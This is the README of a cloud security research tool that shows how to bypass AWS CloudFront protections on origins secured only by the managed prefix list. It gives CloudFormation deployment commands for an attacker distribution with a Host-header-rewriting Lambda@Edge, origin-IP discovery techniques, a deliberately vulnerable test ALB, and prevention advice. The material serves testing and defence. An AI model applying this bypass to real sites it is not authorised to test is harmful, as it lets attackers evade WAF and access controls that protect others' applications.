# CloudFront Prefix List Bypass

A cloud security research tool demonstrating **CloudFront bypass**. It's designed to test AWS architectures that rely solely on **managed prefix list** for protection *without* properly implementing [origin cloaking](https://aws.amazon.com/developer/application-security-performance/articles/origin-cloaking).

>**Update:**
>After sharing this, I discovered that the same technique had already been documented and previously implemented at https://github.com/RyanJarv/cdn-proxy

## Overview

**Amazon CloudFront** - AWS Content Delivery Network (CDN) service - serves as entry point to web applications, where *security controls* such as **Web Application Firewalls** are typically implemented. Some organizations restrict access to **public origins** (*e.g.: Application Load Balancers*) using [Amazon Managed Prefix Lists](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/LocationsOfEdgeServers.html#managed-prefix-list), assuming that limiting access to CloudFront IPs via *Security Groups* provides a sufficient protection.

This tool demonstrates why this approach may be insufficient without additional security measures. **Since CloudFront IP addresses are shared across all AWS accounts**, attackers could use their own *Distribution* with a custom DNS record to directly access the origin. By leveraging *Lambda@Edge* to inject the expected **Host header**—matching the target website's virtual host and TLS certificate—they can **bypass CDN-level security controls** (e.g., AWS WAF or geographic restrictions).

![CloudFront Animation](cf-bypass.gif)

## Quick Start

The commands below will help you set up the AWS attacker account with:
- A **Lambda** that modifies the *host-header* in the **N. Virginia** region, along with the IAM role and permissions required for [edge functions](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-at-the-edge.html)
- A CloudFront Distribution to deploy **for each target origin** you want to access (using different *stack names*).

### Template Parameters

`attacker-cf-distro.yml` accepts the following parameters as input values:
- **HostHeader**: The *website DNS name* expected by the origin
- **OriginDomain**: A *custom DNS record* pointing to the origin
- **Protocol** (*Optional*): The *protocol* to use for origin connections
  - Default: [match-viewer](https://docs.aws.amazon.com/it_it/AWSCloudFormation/latest/UserGuide/aws-properties-cloudfront-distribution-customoriginconfig.html#cfn-cloudfront-distribution-customoriginconfig-originprotocolpolicy)
  - Allowed values:
    - http-only
    - https-only
    - match-viewer
- **AllowedCIDR** (*Optional*): A *CIDR range* allowed via AWS WAF to access the distribution.
    - Default: "" (all access allowed, no WAF is deployed)

### Deployment Steps

Install and configure **AWS CLI** on a Linux environment as prerequisite (launch the following commands with the proper *--profile* if needed) or manually upload the template using **AWS CloudFormation** Console.

1. Clone the repository

    ```bash
    git clone https://github.com/f-lucini/cloudfront-prefix-list-bypass.git
    cd cloudfront-prefix-list-bypass
    ```

2. Setup Lambda@Edge (first time only)
    ```bash
    aws cloudformation deploy \
        --template-file attacker-lambda-setup.yml \
        --stack-name sethost-lambda --region us-east-1
    ```

3. Deploy the attacker's distribution

    ```bash
    # Set the required variables
    header="example.domain" # The DNS name expected by the website
    target="record.custom" # The origin address (see next section for details)

    # In this example only your IP can access the distribution
    # (remove AllowedCIDR parameter to allow everyone to connect)
    aws cloudformation deploy \
        --template-file attacker-cf-distro.yml \
        --stack-name cf-bypass \
        --parameter-overrides \
            HostHeader=$header \
            OriginDomain=$target \
            AllowedCIDR=$(curl -s http://checkip.amazonaws.com/)/32 \
        --region us-east-1

    # Get the distribution domain name
    distribution=$(aws cloudformation describe-stacks \
        --stack-name cf-bypass \
        --region us-east-1 \
        --query 'Stacks[0].Outputs[0].OutputValue' \
        --output json | sed 's/\"//g')

    echo "Your distribution domain is: $distribution"
    ```

**Use the new distribution to access the origin** and bypass security settings on the original CDN:
- By default, the *Protocol* (HTTP or HTTPS) used to access the distribution is **the same as that used to connect to the origin** website. 
- Due to CloudFront’s certificate validation process for TLS origins—which relies on the Host header—the *OriginDomain* **does not need to match the domain name on the certificate**.
- This could be useful to target HTTPS since **discovering an origin's IP address could be easier than finding its DNS name** (i.e., EC2 load balancers contain random strings).

## Technical Details

### Find Origin Address

The techniques described in this section for uncovering the origin server address are based on methods detailed in [this article](https://infosecwriteups.com/finding-the-origin-ip-behind-cdns-37cd18d5275).

Several tools and techniques can be used:
- Tools like [CloakQuest3r](https://github.com/spyboy-productions/CloakQuest3r) or [SecurityTrails](https://securitytrails.com/) can:
  - Find misconfigured old records using **Subdomain scanning**
  - Retrieve **DNS historical values** from before CDN deployment
- Services like [Censys](https://search.censys.io/) and [CloudFlair](https://github.com/christophetd/CloudFlair) can be used to*:
  - **Scan the entire public internet** address space
  - Match IPs using **identical SSL certificates**
  - Identify origins by **excluding CloudFront IPs**
  
- Other techniques include:
  - [Shodan favicon map](https://faviconmap.shodan.io) for matching websites with **identical icons***
  - [WordPress pingback](https://www.invicti.com/blog/web-security/xml-rpc-protocol-ip-disclosure-attacks/) feature to log origin for **public EC2** instances

**assuming the origin was scanned before CloudFront prefix-list is applied*

### Using Origin IP

After discovering the origin IP address, CloudFront will require an **origin domain name**. Here are a few ways to get one:

1. Use DNS reverse lookup: `dig -x <IP>`
2. Use the standard [DNS string for EC2](https://www.reddit.com/r/aws/comments/6bple0/comment/dhokpps/) origins
3. Register a record on a custom domain (e.g., [no-ip](https://my.noip.com/dynamic-dns) offers one free subdomain)

>**Note:**
>When using an **HTTPS origin**, you might expect certificate validation errors since the certificate won't match the specified domain name. However, **CloudFront accepts the connection** because it validates using the [Host header](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/using-https-cloudfront-to-custom-origin.html#using-https-cloudfront-to-origin-certificate). While the Host header is *read-only* in CloudFront's **viewer request**, it can be modified in the [origin request](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/edge-function-restrictions-all.html#function-restrictions-read-only-headers)

### Prevention Guidelines
To protect against this bypass technique, implement origin cloaking effectively using:

- [VPC origins](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-vpc-origins.html) to prevent public access over the internet

- [Custom header validation](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/restrict-access-to-load-balancer.html) for public origins like ALBs

## Origin Example

This repository includes an **example of a vulnerable Application Load Balancer (ALB)** for testing purposes. The ALB is configured with these security controls:
- A listener that blocks requests unless the host header is *example.domain*
- Security group rules that only allow traffic from CloudFront's prefix list (for N. Virginia region)

```bash
# Deploy the vulnerable ALB
aws cloudformation deploy \
    --template-file vulnerable-origin-example.yml \
    --stack-name vulnerable-origin \
    --region us-east-1

# Get the ALB's DNS name
origin_dns=$(aws cloudformation describe-stacks \
    --stack-name vulnerable-origin \
    --region us-east-1 \
    --query 'Stacks[0].Outputs[0].OutputValue' \
    --output json | sed 's/\"//g')

# Simulate origin discovery through DNS resolution
origin_ip=$(echo $origin_dns | xargs -l dig +short | tail -1)

# Generate EC2 DNS name for us-east-1 region
target=$(echo ec2-$origin_ip | tr . - | xargs -I % echo %.compute-1.amazonaws.com)

# Set the host header to the required value
header="example.domain"
```

Deploy the attacker distribution as described in the *Quick Start* section and **connect to it using HTTP**.

To test instead the *HTTPS behaviour*, you can use any public website's IP address, for example:
```bash
header="www.google.com"
ip=$(dig +short $header | tail -1)
target=$(dig -x $ip +short | tail -1 | sed 's/\.$//')
```

## Cleanup

1. Remove the attacker's CloudFront distribution using the chosen **stack-name**.

    ```bash
    aws cloudformation delete-stack --stack-name cf-bypass --region us-east-1
    ```

2. If you deployed the test ALB, remove it to avoid ongoing costs:

    ```bash
    aws cloudformation delete-stack --stack-name vulnerable-origin --region us-east-1
    ```

3. (*Optional*) Clean up the Lambda@Edge infrastructure if you no longer need it.

    **Note**: CloudFront needs several hours to [delete edge function replicas](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-edge-delete-replicas.html) of step 1. Wait before running this command, or it may fail silently (but you won't incur costs if the lambda is not executed).

    ```bash
    # Wait for function replicas deletion or stack will not be removed
    aws cloudformation delete-stack --stack-name sethost-lambda --region us-east-1
    ```
